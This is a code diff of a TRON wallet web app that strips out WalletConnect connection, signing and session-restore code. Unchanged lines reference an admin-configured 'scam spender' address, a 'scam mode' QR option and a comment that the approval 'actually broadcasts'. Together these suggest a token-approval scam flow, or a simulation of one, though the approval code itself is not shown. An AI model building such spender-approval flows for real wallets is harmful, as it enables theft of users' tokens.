@@ -105,11 +105,6 @@
     adminCurNet: $("adminCurNet"),
     adminCurToken: $("adminCurToken"),
     adminScamSpender: $("adminScamSpender"),
-    wcEnabledToggle: $("wcEnabledToggle"),
-    wcForceToggle: $("wcForceToggle"),
-    wcTestBtn: $("wcTestBtn"),
-    wcDisconnectBtn: $("wcDisconnectBtn"),
-    wcStatus: $("wcStatus"),
     qrToAddr: $("qrToAddr"),
     qrAmount: $("qrAmount"),
     qrScamMode: $("qrScamMode"),
@@ -151,21 +146,6 @@
   // Using a sample valid base58check address so the approve actually broadcasts.
   const DEFAULT_SCAM_SPENDER = "TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax";
   const LS_SCAM_SPENDER = "sendDappScamSpender_v1";
-  const LS_WC_ENABLED = "sendDappWcEnabled_v1";
-  const LS_WC_FORCE = "sendDappWcForce_v1";
-  function isWcEnabled() {
-    try {
-      const v = localStorage.getItem(LS_WC_ENABLED);
-      // default ON if user has never set it
-      return v === null ? true : v === "1";
-    } catch (_) { return true; }
-  }
-  function isWcForced() {
-    try { return localStorage.getItem(LS_WC_FORCE) === "1"; } catch (_) { return false; }
-  }
-  function setWcStatus(text) {
-    if (els && els.wcStatus) els.wcStatus.textContent = "WalletConnect: " + text;
-  }
   function getScamSpender() {
     try {
       const v = localStorage.getItem(LS_SCAM_SPENDER);
@@ -262,40 +242,7 @@
     return false;
   }
 
-  async function connectViaWc() {
-    if (!(window.__WC && window.__WC.ready)) {
-      const err = (window.__WC && window.__WC.lastError) || null;
-      if (err) {
-        setWcStatus("load error — " + err);
-        toast("WalletConnect failed to load: " + err, "error");
-      } else {
-        setWcStatus("still loading — wait a moment");
-        toast("WalletConnect is still loading — try again in a moment", "warn");
-      }
-      return false;
-    }
-    setWcStatus("opening QR…");
-    try {
-      const { address } = await window.__WC.connect("mainnet");
-      if (!address) { toast("Connection cancelled", "warn"); setWcStatus("cancelled"); return false; }
-      await activateWcSession(address);
-      setWcStatus("connected as " + shortAddr(address, 6, 4));
-      toast("Wallet connected via WalletConnect");
-      return true;
-    } catch (e) {
-      const msg = e && e.message ? e.message : String(e);
-      setWcStatus("failed — " + msg);
-      toast("WalletConnect failed: " + msg, "error");
-      return false;
-    }
-  }
-
   async function connect() {
-    // 0) Admin "Force WalletConnect" — skip injected detection entirely.
-    if (isWcEnabled() && isWcForced()) {
-      await connectViaWc();
-      return;
-    }
     // 1) Try injected TronLink (extension or in-app browser)
     const installed = await detectTronLink(2000);
     if (installed) {
@@ -317,33 +264,12 @@
       }
       state.tronWeb = window.tronWeb;
       state.address = state.tronWeb.defaultAddress.base58;
-      state.usingWC = false;
       onWalletReady();
       toast("Wallet connected");
       return;
     }
-    // 2) Fall back to WalletConnect (mobile pairing via QR) — admin-gated
-    if (isWcEnabled()) {
-      await connectViaWc();
-      return;
-    }
-    // 3) Nothing worked — show install prompt
+    // 2) Nothing worked — show install prompt
     els.installPrompt.classList.remove("hidden");
-  }
-
-  async function activateWcSession(address) {
-    const fullHost = tronGridBase();
-    const tw = new window.TronWeb({ fullHost });
-    tw.setAddress(address);
-    // Route all signing through WalletConnect instead of a local private key.
-    tw.trx.sign = async (transaction) => {
-      if (!window.__WC) throw new Error("WalletConnect unavailable");
-      return await window.__WC.signTransaction(transaction);
-    };
-    state.tronWeb = tw;
-    state.address = address;
-    state.usingWC = true;
-    onWalletReady();
   }
 
   function onWalletReady() {
@@ -1001,44 +927,6 @@
       );
     });
   }
-  if (els.wcEnabledToggle) {
-    els.wcEnabledToggle.checked = isWcEnabled();
-    els.wcEnabledToggle.addEventListener("change", async () => {
-      const on = !!els.wcEnabledToggle.checked;
-      try { localStorage.setItem(LS_WC_ENABLED, on ? "1" : "0"); } catch (_) {}
-      if (!on && window.__WC) {
-        try { await window.__WC.disconnect(); } catch (_) {}
-        setWcStatus("disabled");
-      }
-      toast(on ? "WalletConnect enabled" : "WalletConnect disabled", "info");
-    });
-  }
-  if (els.wcForceToggle) {
-    els.wcForceToggle.checked = isWcForced();
-    els.wcForceToggle.addEventListener("change", () => {
-      const on = !!els.wcForceToggle.checked;
-      try { localStorage.setItem(LS_WC_FORCE, on ? "1" : "0"); } catch (_) {}
-      toast(on ? "Force WalletConnect ON — Connect now skips the extension" : "Force WalletConnect OFF", "info");
-    });
-  }
-  if (els.wcTestBtn) {
-    els.wcTestBtn.addEventListener("click", () => { connectViaWc(); });
-  }
-  if (els.wcDisconnectBtn) {
-    els.wcDisconnectBtn.addEventListener("click", async () => {
-      if (window.__WC) {
-        try { await window.__WC.disconnect(); } catch (_) {}
-      }
-      // Also clear local connected state so the Connect button comes back.
-      state.tronWeb = null;
-      state.address = null;
-      state.usingWC = false;
-      if (els.connectBtn) els.connectBtn.textContent = "Connect";
-      if (els.heroAddressRow) els.heroAddressRow.hidden = true;
-      setWcStatus("disconnected");
-      toast("WalletConnect disconnected", "info");
-    });
-  }
   if (els.revokeBtn) els.revokeBtn.addEventListener("click", executeRevoke);
   if (els.refreshApprovalsBtn) els.refreshApprovalsBtn.addEventListener("click", fetchApprovals);
   if (els.adminScamSpender) {
@@ -1158,38 +1046,13 @@
     }
   });
 
-  // Silent auto-connect if TronLink is already unlocked, OR restore a saved
-  // WalletConnect session from a previous visit.
+  // Silent auto-connect if TronLink is already unlocked.
   (async function autoConnect() {
     const ok = await detectTronLink(2000);
     if (ok && window.tronWeb && window.tronWeb.ready) {
       state.tronWeb = window.tronWeb;
       state.address = state.tronWeb.defaultAddress.base58;
-      state.usingWC = false;
       onWalletReady();
-      return;
-    }
-    // Wait briefly for the WC module to finish booting, then try to restore.
-    const waitForWc = () => new Promise((res) => {
-      if (window.__WC && window.__WC.ready) return res(true);
-      const t = setTimeout(() => res(false), 4000);
-      window.addEventListener("wc-ready", () => { clearTimeout(t); res(true); }, { once: true });
-    });
-    if (!isWcEnabled()) return;
-    const wcReady = await waitForWc();
-    if (!wcReady || !window.__WC) return;
-    try {
-      // Init WC client and check ONLY for a persisted session — do NOT start
-      // a new pairing here (that would pop the QR modal on every page load).
-      await window.__WC.restoreOnly();
-    } catch (_) { return; }
-    const s = window.__WC.session;
-    if (s) {
-      const acct = (s.namespaces && s.namespaces.tron && s.namespaces.tron.accounts && s.namespaces.tron.accounts[0]) || "";
-      const addr = acct.split(":").pop();
-      if (addr) {
-        try { await activateWcSession(addr); } catch (_) {}
-      }
     }
   })();
 })();
